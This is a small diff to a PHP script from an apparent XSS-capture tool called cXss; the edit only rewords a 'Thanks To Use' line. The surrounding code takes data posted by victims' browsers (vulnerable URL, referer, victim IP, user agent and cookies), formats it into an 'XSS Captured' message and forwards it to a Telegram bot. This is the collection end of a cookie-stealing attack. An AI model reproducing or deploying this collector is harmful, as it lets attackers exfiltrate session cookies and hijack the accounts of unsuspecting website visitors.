@@ -13,7 +13,7 @@ if(isset($_POST['data'])){
 	$data = json_encode($obj);
 
 	$d = json_decode($data);
-	$message = "XSS Captured [".$d->datetime."]\n\nURL : `".$d->origin."`\nVuln Url : `".$d->uri."`\nReferer : `".$d->referer."`\nVictim IP : `".$d->ip_address."`\nVictim User Agent : \n`".$d->user_agent."`\n\nCookies : \n`".$d->cookies."`\n\nThanks To Use cXss\nFrom : `".$_SERVER['HTTP_HOST']."`";
+	$message = "XSS Captured [".$d->datetime."]\n\nURL : `".$d->origin."`\nVuln Url : `".$d->uri."`\nReferer : `".$d->referer."`\nVictim IP : `".$d->ip_address."`\nVictim User Agent : \n`".$d->user_agent."`\n\nCookies : \n`".$d->cookies."`\n\nThanks To Using cXss\nFrom : `".$_SERVER['HTTP_HOST']."`";
 
 	// Send Notify to Telegram
 	if(!empty($token)&&!empty($idRecipient)){
